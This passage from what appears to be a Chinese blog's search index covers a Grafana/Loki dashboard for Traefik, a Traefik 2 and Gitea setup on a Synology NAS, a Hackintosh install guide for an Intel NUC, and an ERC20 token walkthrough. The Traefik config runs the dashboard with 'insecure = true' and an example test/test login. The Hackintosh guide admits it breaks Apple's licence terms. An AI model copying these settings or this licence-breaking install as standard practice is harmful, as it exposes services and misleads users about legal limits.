 latency&quot;,&quot;dashes&quot;:true,&quot;fillGradient&quot;:3&#125;],&quot;spaceLength&quot;:10,&quot;stack&quot;:false,&quot;steppedLine&quot;:false,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;quantile_over_time(0.95,&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |= \\&quot;RequestProtocol\\&quot;| json | unwrap Duration |  __error__=\\&quot;\\&quot;  [$__interval]) by (ServiceName)&quot;,&quot;hide&quot;:false,&quot;legendFormat&quot;:&quot; &#123;&#123; ServiceName &#125;&#125;&quot;,&quot;refId&quot;:&quot;C&quot;&#125;],&quot;thresholds&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:168&quot;,&quot;colorMode&quot;:&quot;critical&quot;,&quot;fill&quot;:true,&quot;line&quot;:true,&quot;op&quot;:&quot;gt&quot;,&quot;value&quot;:0.3,&quot;yaxis&quot;:&quot;left&quot;&#125;],&quot;timeFrom&quot;:null,&quot;timeRegions&quot;:[],&quot;timeShift&quot;:null,&quot;title&quot;:&quot;95th percentile of Request Time&quot;,&quot;tooltip&quot;:&#123;&quot;shared&quot;:true,&quot;sort&quot;:0,&quot;value_type&quot;:&quot;individual&quot;&#125;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;graph&quot;,&quot;xaxis&quot;:&#123;&quot;buckets&quot;:null,&quot;mode&quot;:&quot;time&quot;,&quot;name&quot;:null,&quot;show&quot;:true,&quot;values&quot;:[]&#125;,&quot;yaxes&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:178&quot;,&quot;format&quot;:&quot;ns&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:true&#125;,&#123;&quot;$$hashKey&quot;:&quot;object:179&quot;,&quot;format&quot;:&quot;short&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:false&#125;],&quot;yaxis&quot;:&#123;&quot;align&quot;:false,&quot;alignLevel&quot;:null&#125;&#125;,&#123;&quot;aliasColors&quot;:&#123;&quot;95th percentile&quot;:&quot;blue&quot;,&quot;max latency&quot;:&quot;super-light-blue&quot;&#125;,&quot;bars&quot;:false,&quot;dashLength&quot;:10,&quot;dashes&quot;:false,&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;unit&quot;:&quot;ns&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;fill&quot;:5,&quot;fillGradient&quot;:9,&quot;gridPos&quot;:&#123;&quot;h&quot;:9,&quot;w&quot;:8,&quot;x&quot;:8,&quot;y&quot;:18&#125;,&quot;hiddenSeries&quot;:false,&quot;id&quot;:34,&quot;interval&quot;:&quot;30s&quot;,&quot;legend&quot;:&#123;&quot;alignAsTable&quot;:false,&quot;avg&quot;:false,&quot;current&quot;:false,&quot;max&quot;:false,&quot;min&quot;:false,&quot;rightSide&quot;:false,&quot;show&quot;:true,&quot;total&quot;:false,&quot;values&quot;:false&#125;,&quot;lines&quot;:true,&quot;linewidth&quot;:1,&quot;nullPointMode&quot;:&quot;null&quot;,&quot;options&quot;:&#123;&quot;alertThreshold&quot;:true&#125;,&quot;percentage&quot;:false,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;pointradius&quot;:2,&quot;points&quot;:false,&quot;renderer&quot;:&quot;flot&quot;,&quot;seriesOverrides&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:232&quot;,&quot;alias&quot;:&quot;max latency&quot;,&quot;dashes&quot;:true,&quot;fillGradient&quot;:3&#125;],&quot;spaceLength&quot;:10,&quot;stack&quot;:false,&quot;steppedLine&quot;:false,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;max by (ServiceName) (max_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |= \\&quot;RequestProtocol\\&quot; |json | unwrap Duration |  __error__=\\&quot;\\&quot;  [$__interval]))&quot;,&quot;hide&quot;:false,&quot;legendFormat&quot;:&quot;&#123;&#123; ServiceName&#125;&#125;&quot;,&quot;refId&quot;:&quot;D&quot;&#125;],&quot;thresholds&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:168&quot;,&quot;colorMode&quot;:&quot;critical&quot;,&quot;fill&quot;:true,&quot;line&quot;:true,&quot;op&quot;:&quot;gt&quot;,&quot;value&quot;:0.3,&quot;yaxis&quot;:&quot;left&quot;&#125;],&quot;timeFrom&quot;:null,&quot;timeRegions&quot;:[],&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Max Age of Request Time&quot;,&quot;tooltip&quot;:&#123;&quot;shared&quot;:true,&quot;sort&quot;:0,&quot;value_type&quot;:&quot;individual&quot;&#125;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;graph&quot;,&quot;xaxis&quot;:&#123;&quot;buckets&quot;:null,&quot;mode&quot;:&quot;time&quot;,&quot;name&quot;:null,&quot;show&quot;:true,&quot;values&quot;:[]&#125;,&quot;yaxes&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:178&quot;,&quot;format&quot;:&quot;ns&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:true&#125;,&#123;&quot;$$hashKey&quot;:&quot;object:179&quot;,&quot;format&quot;:&quot;short&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:false&#125;],&quot;yaxis&quot;:&#123;&quot;align&quot;:false,&quot;alignLevel&quot;:null&#125;&#125;,&#123;&quot;aliasColors&quot;:&#123;&quot;95th percentile&quot;:&quot;blue&quot;,&quot;max latency&quot;:&quot;super-light-blue&quot;&#125;,&quot;bars&quot;:false,&quot;dashLength&quot;:10,&quot;dashes&quot;:false,&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;unit&quot;:&quot;decbytes&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;fill&quot;:5,&quot;fillGradient&quot;:9,&quot;gridPos&quot;:&#123;&quot;h&quot;:9,&quot;w&quot;:8,&quot;x&quot;:16,&quot;y&quot;:18&#125;,&quot;hiddenSeries&quot;:false,&quot;id&quot;:35,&quot;interval&quot;:&quot;30s&quot;,&quot;legend&quot;:&#123;&quot;alignAsTable&quot;:false,&quot;avg&quot;:false,&quot;current&quot;:false,&quot;max&quot;:false,&quot;min&quot;:false,&quot;rightSide&quot;:false,&quot;show&quot;:true,&quot;total&quot;:false,&quot;values&quot;:false&#125;,&quot;lines&quot;:true,&quot;linewidth&quot;:1,&quot;nullPointMode&quot;:&quot;null&quot;,&quot;options&quot;:&#123;&quot;alertThreshold&quot;:true&#125;,&quot;percentage&quot;:false,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;pointradius&quot;:2,&quot;points&quot;:false,&quot;renderer&quot;:&quot;flot&quot;,&quot;seriesOverrides&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:232&quot;,&quot;alias&quot;:&quot;max latency&quot;,&quot;dashes&quot;:true,&quot;fillGradient&quot;:3&#125;],&quot;spaceLength&quot;:10,&quot;stack&quot;:false,&quot;steppedLine&quot;:false,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;sum by (ServiceName) (sum_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |= \\&quot;RequestProtocol\\&quot; |json | unwrap RequestContentSize |  __error__=\\&quot;\\&quot;  [$__interval]))&quot;,&quot;hide&quot;:false,&quot;legendFormat&quot;:&quot;&#123;&#123; ServiceName&#125;&#125;&quot;,&quot;refId&quot;:&quot;D&quot;&#125;],&quot;thresholds&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:168&quot;,&quot;colorMode&quot;:&quot;critical&quot;,&quot;fill&quot;:true,&quot;line&quot;:true,&quot;op&quot;:&quot;gt&quot;,&quot;value&quot;:0.3,&quot;yaxis&quot;:&quot;left&quot;&#125;],&quot;timeFrom&quot;:null,&quot;timeRegions&quot;:[],&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Requests Size&quot;,&quot;tooltip&quot;:&#123;&quot;shared&quot;:true,&quot;sort&quot;:0,&quot;value_type&quot;:&quot;individual&quot;&#125;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;graph&quot;,&quot;xaxis&quot;:&#123;&quot;buckets&quot;:null,&quot;mode&quot;:&quot;time&quot;,&quot;name&quot;:null,&quot;show&quot;:true,&quot;values&quot;:[]&#125;,&quot;yaxes&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:178&quot;,&quot;format&quot;:&quot;decbytes&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:true&#125;,&#123;&quot;$$hashKey&quot;:&quot;object:179&quot;,&quot;format&quot;:&quot;short&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:false&#125;],&quot;yaxis&quot;:&#123;&quot;align&quot;:false,&quot;alignLevel&quot;:null&#125;&#125;],&quot;refresh&quot;:false,&quot;schemaVersion&quot;:27,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1h&quot;,&quot;to&quot;:&quot;now&quot;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Traefik Via Loki&quot;,&quot;uid&quot;:&quot;fJarCeaGk&quot;,&quot;version&quot;:2&#125;\n\n到这里，两个大盘就完美展示了，具体Grafana如何使用可自行查阅资料。\n值得注意的是，后续增加容器服务，只要注册在Traefik，就会自动联动到监控系统，无需任何二次配置，实现简单，便捷，统一管理。\n本文所涉及的文件均在此处可找到：https://github.com/yfgeek/traefik-docker-compose\n","categories":["docker"],"tags":["traefik"]},{"title":"Traefik 2 群晖硬核指南","url":"http://www.yfgeek.com/2021/03/10/Traefik 2 群晖硬核指南/","content":"家中群晖nas使用docker运行各种各样的应用也有几年了，多半是自用，同时软路由启动着DDNS自动解析域名的服务。前几天，想和朋友共享gitea，创建一个私有的git服务器，决定再次维护一次。\n\n阶段一：家中的各种docker容器均各自映射了各自的端口，通过路由器端口映射映射至互联网。\n缺点：1. 端口混乱难以记住 2. 缺乏统一日志记录。\n阶段二：我又创建了一个docker内部网，在总入口启动了一个nginx容器，同时把各应用加入到docker内部网中，将应用的端口统一，通过nginx配置虚拟主机，路由到不同的应用下，后端地址依赖于容器的主机名解析。\n缺点：1. 容器变动起来十分麻烦，无法轻松的增加容器副本的负载均衡；2. nginx重启强制依赖于各服务的运行状态，否则会启动失败；3. 繁琐的配置懒得手动申请SSL。\n阶段三：因路由器的配置问题，上行速度无法跑满，去掉了硬件路由器的方式，在群晖nas上启动了lede软路由，软路由作为DMZ区域，所有出口流量走软路由，速度极大的提升了，北京地区ms级别极速打开，上行速度跑满，但上述问题，依然繁琐。\n\n我的VPS用过一段时间的caddy，可基于acme自动注册SSL、续签SSL。考虑到容器时代可能会自由启停增加容器副本，nginx增改配置文件的方式，在服务配置、域名配置、SSL配置方面，显得传统而又繁琐。\n为了彻底改变这种落后的机制，刚好在研究k8s的时候，我发现了traefik，刚好能满足我的需求。然而网上大部分内容均为k8s相结合的ingress-traefik，虽然k8s确实香，但家用nas基本上和k8s扯不上关系也不需要，网上仅有一篇文章描述群晖如何安装traefik1，决定分享一下我容器化部署taefik2的填坑经验。\nTraefik\nTraefik 是一个开源的可以使得服务发布变得轻松有趣的边缘路由器。它负责接收你系统的请求，然后使用合适的组件来对这些请求进行处理。\n使用 Traefik，不需要维护或者同步一个独立的配置文件：因为一切都会自动配置，实时操作的（无需重新启动，不会中断连接）。使用 Traefik，你可以花更多的时间在系统的开发和新功能上面，而不是在配置和维护工作状态上面花费大量时间。\n除了众多的功能之外，Traefik 的与众不同之处还在于它会自动发现适合你服务的配置。当 Traefik 在检查你的服务时，会找到服务的相关信息并找到合适的服务来满足对应的请求。\nTraefik 部署前提：\n\n\n群晖打开了SSH\n安装了docker套件\n默认磁盘目录是volume1\n\n\nSSH登录至群晖，执行如下命令：\ncd /volume1/docker/mkdir traefikcd traefikmkdir configmkdir ssl# 创建traefik专属网络docker network create traefiktouch docker-compose.yml\n亮出我们的利器，通过docker-compose启动，编辑刚刚创建的yml文件 docker-compose.yml：\nversion: &#x27;3.7&#x27;services:  traefik:    container_name: traefik    image: traefik:v2.1.3    restart: always    environment:      - CF_API_EMAIL=CLOUDFLARE登录邮箱      - CLOUDFLARE_DNS_API_TOKEN=CLOUDFLARE创建的DNS TOKEN      - CLOUDFLARE_ZONE_API_TOKEN=CLOUDFLARE创建的API TOKEN    ports:      - &quot;52080:80&quot;      - &quot;52443:443&quot;      - &quot;52022:22&quot;    networks:      - traefik    command: traefik --configFile /etc/traefik.toml    volumes:      - /var/run/docker.sock:/var/run/docker.sock:ro      - ./ssl/:/data/ssl/:rw      - ./traefik.toml:/etc/traefik.toml:ro      - ./config/:/etc/traefik/config/:ro    healthcheck:      test: [&quot;CMD-SHELL&quot;, &quot;wget -q --spider --proxy off localhost:8080/ping || exit 1&quot;]networks:  traefik:    external: true\n\n值得注意的是，因为运营商屏蔽了22、443、80端口，于是我使用52022、52443、52080做映射替代，如未被屏蔽，请忽略。\n为了自动申请SSL证书，提交成功率，我才用DNS Challenge的方式校验有效性，因此需Cloudflare的环境信息，如果你的域名没有配置Cloudflare解析，可以根据这篇文章置换相应变量。\n\n同时，我们在traefik目录下创建traefik.toml文件，作为全局配置文件，一般不会有改动。\n[global]  checkNewVersion = false  sendAnonymousUsage = false[log]  level = &quot;WARN&quot;  format = &quot;common&quot;[api]  dashboard = true  insecure = true[ping][accessLog][providers]  [providers.docker]    watch = true    exposedByDefault = false    endpoint = &quot;unix:///var/run/docker.sock&quot;    swarmMode = false    useBindPortIP = false    network = &quot;traefik&quot;  [providers.file]    watch = true    directory = &quot;/etc/traefik/config&quot;    debugLogGeneratedTemplate = true[entryPoints]  [entryPoints.http]    address = &quot;:80&quot;  [entryPoints.https]    address = &quot;:443&quot;  [entryPoints.ssh]    address = &quot;:22&quot;[certificatesResolvers.my.acme]  email = &quot;CLOUDFLARE登录邮箱&quot;  storage = &quot;/data/ssl/acme.json&quot;  [certificatesResolvers.my.acme.dnsChallenge]    resolvers = [&quot;1.1.1.1:53&quot;, &quot;8.8.8.8:53&quot;]    provider = &quot;cloudflare&quot;    delayBeforeCheck = 30\n\n随后，进入config目录。\n创建dashboard.nas.yfgeek.com.toml文件，作为traefik展示面板的配置文件，因为相对固化，所以采用文件配置文件的形式，traefik支持文件加载配置。\n[http.middlewares.dash-compress.compress][http.middlewares.dash-auth.basicAuth]  users = [    &quot;test:$apr1$ux2tmr06$Qz5r/BNEfzdxriR/0o30Z1&quot;,  ][http.routers.dashboard]  rule = &quot;Host(`dashboard.nas.yfgeek.com`)&quot;  entrypoints = [&quot;http&quot;]  service = &quot;dashboard@internal&quot;  middlewares = [&quot;dash-auth&quot;, &quot;dash-compress&quot;][http.routers.api]  rule = &quot;Host(`dashboard.nas.yfgeek.com`) &amp;&amp; PathPrefix(`/api`)&quot;  entrypoints = [&quot;http&quot;]  service = &quot;api@internal&quot;  middlewares = [&quot;dash-auth&quot;, &quot;dash-compress&quot;][http.routers.ping]  rule = &quot;Host(`dashboard.nas.yfgeek.com`) &amp;&amp; PathPrefix(`/ping`)&quot;  entrypoints = [&quot;http&quot;]  service = &quot;ping@internal&quot;  middlewares = [&quot;dash-auth&quot;, &quot;dash-compress&quot;]\n\n这个文件中，我们设置了一个用于验证的中间件，进入网站之前会默认进行验证，密码是htpasswd生成规则，例子中用户名是test，密码是test，如需定制，可到这个网站生成密码。\n全部创建好后，目录结构如下：\n\n|____config| |____dashboard.nas.yfgeek.com.toml|____ssl|____docker-compose.yml|____traefik.toml\n\n确认无误，我们使用启动大法，执行如下命令。\ndocker-compose up -ddocker container logs traefik -f\n\n不出意外，服务即将启动成功，可以看到日志，如果有问题就见招拆招即可。\n\nGitea 部署traefik启动好后，我们还没有应用接入，接下来，整理一下原有的gitea容器，将其写为docker compose文件，同理，在docker目录下新建一个gitea目录。\ncd /volume1/docker/mkdir giteacd giteatouch docker-compose.yml\n\ndocker-compose.yml 参考如下：\nversion: &#x27;3&#x27;services:  gitea:    container_name: gitea    image: gitea/gitea:latest    restart: always    environment:      - USER_UID=1000      - USER_GID=1000    networks:      - traefik    expose:      - 3000      - 22    labels:      - traefik.enable=true      # 设置HTTP强制跳转HTTPS 中间件      - traefik.http.middlewares.redirect-https.redirectscheme.scheme=https      - traefik.http.middlewares.redirect-https.redirectscheme.port=52443      # HTTP配置      - traefik.http.routers.gitea-web.rule=Host(`git.nas.yfgeek.com`,`git.yfgeek.com`)      - traefik.http.routers.gitea-web.entrypoints=http      - traefik.http.routers.gitea-web.service=gitea-web      - traefik.http.routers.gitea-web.middlewares=redirect-https      # HTTPS配置      - traefik.http.routers.gitea-web-secure.rule=Host(`git.nas.yfgeek.com`,`git.yfgeek.com`)      - traefik.http.routers.gitea-web-secure.entrypoints=https      - traefik.http.routers.gitea-web-secure.service=gitea-web      - traefik.http.routers.gitea-web-secure.tls=true      - traefik.http.routers.gitea-web-secure.tls.certresolver=my      - traefik.http.services.gitea-web.loadbalancer.server.port=3000      # SSH配置      - traefik.tcp.routers.gitea-ssh.rule=HostSNI(`*`)      - traefik.tcp.routers.gitea-ssh.entrypoints=ssh      - traefik.tcp.routers.gitea-ssh.service=gitea-ssh      - traefik.tcp.services.gitea-ssh.loadbalancer.server.port=22    volumes:      - /volume1/docker/gitea:/datanetworks:  traefik:    external: true\n\ntraefik是通过增加label的方式，自动注册服务的，无需任何配置文件，实时生效，如果容器挂了，转发关系自动失效。配置文件中，利用redirectscheme的中间件方式，增加了HTTP强制跳转至HTTPS。\n针对HTTPS的访问方式，traefik会自动注册访问域名rule=Host(`git.nas.yfgeek.com`,`git.yfgeek.com`)的两个域名的，因此一定要确认无误。\n同时，为了实现后续的SSL自动签发、host自动注册，我在DDNS中增加了域名的泛解析配置。\n确认无误后，执行如下命令\ndocker-compose up -d\n\n这里有一个小坑，值得注意，acme申请证书需要一段时间，如果配置信息有误，是不会申请成功的。因此需要查看下traefik的日志。\ndocker container logs traefik -f\n\n找到问题见招拆招，如果是权限等问题，exec进入容器，通过chmod命令解决即可。\n随后访问域名的HTTP(http://git.yfgeek.com:52080)，将被强制跳转至HTTPS(https://git.yfgeek.com:52443)，即可看到SSL证书自动申请、配置成功。与此同时，基于TCP的SSH服务也被顺利转发。\n\n反过来，我们查看dashboard，即可看到gitea的服务已经成功在dashboard中注册了，并且一切顺利。\n\n\n类似的，如果后续增加新的docker应用，可直接编辑docker compose文件，增加label，配置域名，直接解析、自动申请SSL，方便极了，生产力得到了极大的提升。\n下一期我将讲讲如何traefik+ptomethus+granafa，实现自动采集数据，归集日志，构建网站监控系统，欢迎持续关注。\n参考文章\n\nhttps://juejin.cn/post/6844904053722316813\nhttps://soulteary.com/2020/02/01/configure-traefik-v2-based-web-server.html\nhttps://www.qikqiak.com/traefik-book/\nhttps://doc.traefik.io/traefik/master/https/acme/\n\n","categories":["docker"],"tags":["traefik"]},{"title":"NUC5i5RYH Big Sur 黑苹果安装教程","url":"http://www.yfgeek.com/2021/02/26/NUC5i5RYH-BigSur-黑苹果安装手记/","content":"\n本文内容仅供学习，需要十分清楚的是黑苹果其实是一个具有潜在盗版性质的行为，因为它违反了 EULA 法案(EULA)。 所以本教程只是以安装黑苹果为一个引线，进而介绍和分享关于苹果操作系统的相关知识和系统的一些安装方法，不参与任何商业活动，也不允许任何人使用本文章搜集和创作的资料参与任何商业活动。如果你想要开始黑苹果技术，我们希望你是抱着一个极客的心态来的，并且将这些技术应用到其他相关领域的学习和工作中去。\n\n2021年年度更新Big Sur版本，本次版本更换Clover到OpenCore，对如下内容进行更新。\n本人全部过程参考以下教程，为减少您的坑，我已经把我调教好的配置文件和驱动上传至GitHub。\n效果图\n\nDisplay Port 完美 (4K)\nHDMI 完美\n音频输出 完美\n睿频 完美\n休眠 完美\nUSB3.0 完美\nWIFi 完美\n蓝牙 完美\n\n材料\n至少8GB U盘一枚\nmacOS Big Sur Installer 镜像\n本机硬盘 GPT分区 至少预留一个空分区 如果全盘安装，请将硬盘清空\nTransMac(dmg文件打开工具)\nDiskGenius\n一个winpe盘(用于处理紧急情况，可选，也可以使用备用电脑)\n为您调教的NUC5i5RYH专用配置文件\n\n准备安装U盘确保上述到位后，使用TransMac打开下载好的dmg文件。具体操作步骤如下：\n\n把 U 盘插入电脑，然后再打开之前安装好的 TransMac 软件，找到窗口左侧中出现的U盘；\n将 U 盘格式为 Mac 系统下的磁盘格式，选中 U 盘并右键选择“Format Disk for Mac”选项，保持默认的 Mac OS Extended HFS+ 即可；\n随后软件会提示我们是否要将此 U 盘格式为 Mac 磁盘格式，点击 OK 按钮继续。接着请等待软件将 U 盘格式为 Mac 磁盘格式；\n当 U 盘被格式化完成以后，选中 U 盘并点击右键选择“Restore with Disk image”选项，选择了一个 Mac OS的Mac系统镜像；\n此时软件会提示我们 U 盘上数据将会被清除，点击“Yes”按钮继续。等待软件将 Mac 系统的镜像恢复到 U 盘里。\n当出现“Restore Complete”的时候就代表MacOS的U盘启动盘制作完成了。\n\n\n刻录好后，别急，使用DiskGenuis打开U盘刻录好的EFI分区，打开为您调教的NUC5i5RYH专用配置文件，将EFI目录下的目录替换EFI分区内的目录。\n大功告成，重启。\n进入安装阶段 开机，F2进入BIOS，设置如下\n\nDevices-&gt;Onboard Devices-&gt;Legacy Device Configuration,  “Serial Port”  设置为 disabled\n\nBoot-&gt;Boot Configuration,  “Network Boot” 设置为 disabled\n\nPower-&gt;Secondary Power Settings, “Wake on LAN from S4/S5”, 设置为 “Stay Off”\n\nDevices-&gt;USB, “xHCI Mode” 设置为 “Smart Auto”\n\nDevices-&gt;Video, “IGD Minimum Memory” 设置为 64mb\n\nDevices-&gt;Video, “IGD Aperture Size” 设置为 256mb\n\nBoot-&gt;Secure Boot, “Secure Boot” 设置为 disabled\n\nSecurity-&gt;Security Features, “Execute Disable Bit” 设置为 enabled\n\n\n开机，按选择U盘启动，进入Clover界面，选择优盘启动。\n稍等片刻，即可进入安装界面。\n\n\n选择磁盘工具，选择要安装的磁盘，将其格式化为APFS文件系统。\n随后的事情就很简单了，顺序安装软件即可。\n第一次重启进度条走完后，会自动重启，此时非常重要，重启后一定要选择macOS install\n然后进入\n第二次重启重启后选择Boot macOS from 硬盘名，本次重启会像安装iOS一样，走黑苹果下的进度条，走完即可。耐心等待。\n进入桌面不出意外的话，就能进入正常的macOS第一次安装后的桌面，进入常规设置后。\n安装OpenCore Configurator，便于后续维护，同时挂载EFI 分区。\n# 一、进入Single User模式：sudo -s# 二、在Volumes下创建EFI文件夹：mkdir /Volumes/EFI# 三、确定分区：diskutil list# 一般的EFI分区会在disk0s1，# 四、挂载分区：mount -t msdos /dev/disk0s1 /Volumes/EFI# 五、如果使用结束卸载分区：diskutil unmount /dev/disk0s1\n\n打开之前为您调教的NUC5i5RYH专用配置文件，将EFI目录下的目录替换加载好的EFI分区内的目录。\n\n重启，大功告成！\n","categories":["Mac"],"tags":["Mac"]},{"title":"走进流式付款的世界 Sablier 源码解读","url":"http://www.yfgeek.com/2021/01/24/走进流式付款的世界 Sablier 源码解读/","content":"Sablier是以太坊实时金融协议，可以实现流式付款。简单的来说，就是可以最规定时间内，向指定地址不断的匀速付款，它改变了原有的支付方式。\n以老板支付工资为例，传统金融往往是每个月在固定时日支付工资，或是日结工资，难以做到秒结、分结。在去中心化金融（Defi）世界中，Sablier利用以太坊的智能合约，完美做到了向任何人付款，达到“秒结”的目的。\nSablier有三个特色：\n\n秒结 \n使用Dai（去中心化稳定币）支付 \n基于ERC 1620构建\n\n可以应用的场景：支付薪水、订阅内容、咨询服务、纳税、租赁行业、停车场付费等。\n而这一切，都依赖于智能合约，那就跟我一起走进这个神奇的智能合约的世界。\nERC 20开始之前，需要做一些基础铺垫，先解释一下万物之源——ERC 20。\nERC全称“Ethereum Request for Comment”，其实就是以太坊草案的意思，ERC20，就是其草案编号。ERC20是Token标准。\nERC20让“发币”变得更加简单，门槛极低，开启了通证经济时代。任何人只要符合这个标准，就可以发行自己的Token合约（代币）。\nToken合约Token合约中的token，指的是代币，通过智能合约实现了一种代币持有情况的映射关系。如下图所示，一个token合约就是一个包含了一个对账户地址及其余额的映射的智能合约。\n\n在以太坊浏览器中，我们可以浏览发行的ERC20代币Token和其合约代码。\n\nEIP 20 协议EIP 20是对ERC20的协议实现，并且已经实现到以太坊中。EIP20提供的功能类似于将代币从一个账户转移到另一个账户，以及获取当前代币余额等功能。\n例子\n方法\n// 代币名称 如&quot;MyToken&quot;function name() public view returns (string)// 代币缩写 如&quot;MT&quot;function symbol() public view returns (string)// 精度，如8，则意味着代币实际值需除以100000000function decimals() public view returns (uint8)// 总发行量function totalSupply() public view returns (uint256)// 返回某个地址的余额function balanceOf(address _owner) public view returns (uint256 balance)// 转账_value个Token到_to地址上，同时必须触发Transfer事件function transfer(address _to, uint256 _value) public returns (bool success)// 转账_value个Token从_from到_to地址上，同时必须触发Transfer事件function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)// 允许_spender多次提现，_value为限额，授权用户可代表我们花费的代币数function approve(address _spender, uint256 _value) public returns (bool success)// 允许_spender从_owner提现，授权花费的代币数function allowance(address _owner, address _spender) public view returns (uint256 remaining)\n\n事件\n以太坊的事件更类似于日志性质，可与前端同步数据，同时可以存储数据记录每笔交易的过程，方便溯源。\nevent Transfer(address indexed _from, address indexed _to, uint256 _value)event Approval(address indexed _owner, address indexed _spender, uint256 _value)\n\n例子\npragma solidity ^0.4.20;interface tokenRecipient &#123; function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; &#125;contract TokenERC20 &#123;    string public name;    string public symbol;    uint8 public decimals = 18;  // decimals 可以有的小数点个数，最小的代币单位。18 是建议的默认值    uint256 public totalSupply;    // 用mapping保存每个地址对应的余额    mapping (address =&gt; uint256) public balanceOf;    // 存储对账号的控制    mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;    // 事件，用来通知客户端交易发生    event Transfer(address indexed from, address indexed to, uint256 value);    // 事件，用来通知客户端代币被消费    event Burn(address indexed from, uint256 value);    /**     * 初始化构造     */    constructor(uint256 initialSupply, string tokenName, string tokenSymbol) public &#123;        totalSupply = initialSupply * 10 ** uint256(decimals);  // 供应的份额，份额跟最小的代币单位有关，份额 = 币数 * 10 ** decimals。        balanceOf[msg.sender] = totalSupply;                // 创建者拥有所有的代币        name = tokenName;                                   // 代币名称        symbol = tokenSymbol;                               // 代币符号    &#125;    /**     * 代币交易转移的内部实现     */    function _transfer(address _from, address _to, uint _value) internal &#123;        // 确保目标地址不为0x0，因为0x0地址代表销毁        require(_to != 0x0);        // 检查发送者余额        require(balanceOf[_from] &gt;= _value);        // 确保转移为正数个        require(balanceOf[_to] + _value &gt; balanceOf[_to]);        // 以下用来检查交易，        uint previousBalances = balanceOf[_from] + balanceOf[_to];        // Subtract from the sender        balanceOf[_from] -= _value;        // Add the same to the recipient        balanceOf[_to] += _value;        emit Transfer(_from, _to, _value);        // 用assert来检查代码逻辑。        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);    &#125;    /**     *  代币交易转移     * 从创建交易者账号发送`_value`个代币到 `_to`账号     *     * @param _to 接收者地址     * @param _value 转移数额     */    function transfer(address _to, uint256 _value) public &#123;        _transfer(msg.sender, _to, _value);    &#125;    /**     * 账号之间代币交易转移     * @param _from 发送者地址     * @param _to 接收者地址     * @param _value 转移数额     */    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123;        require(_value &lt;= allowance[_from][msg.sender]);     // Check allowance        allowance[_from][msg.sender] -= _value;        _transfer(_from, _to, _value);        return true;    &#125;    /**     * 设置某个地址（合约）可以交易者名义花费的代币数。     *     * 允许发送者`_spender` 花费不多于 `_value` 个代币     *     * @param _spender The address authorized to spend     * @param _value the max amount they can spend     */    function approve(address _spender, uint256 _value) public    returns (bool success) &#123;        allowance[msg.sender][_spender] = _value;        return true;    &#125;    /**     * 设置允许一个地址（合约）以交易者名义可最多花费的代币数。     *     * @param _spender 被授权的地址（合约）     * @param _value 最大可花费代币数     * @param _extraData 发送给合约的附加数据     */    function approveAndCall(address _spender, uint256 _value, bytes _extraData)    public    returns (bool success) &#123;        tokenRecipient spender = tokenRecipient(_spender);        if (approve(_spender, _value)) &#123;            spender.receiveApproval(msg.sender, _value, this, _extraData);            return true;        &#125;    &#125;    /**     * 销毁创建者账户中指定个代币     */    function burn(uint256 _value) public returns (bool success) &#123;        require(balanceOf[msg.sender] &gt;= _value);   // Check if the sender has enough        balanceOf[msg.sender] -= _value;            // Subtract from the sender        totalSupply -= _value;                      // Updates totalSupply        emit Burn(msg.sender, _value);        return true;    &#125;    /**     * 销毁用户账户中指定个代币     *     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.     *     * @param _from the address of the sender     * @param _value the amount of money to burn     */    function burnFrom(address _from, uint256 _value) public returns (bool success) &#123;        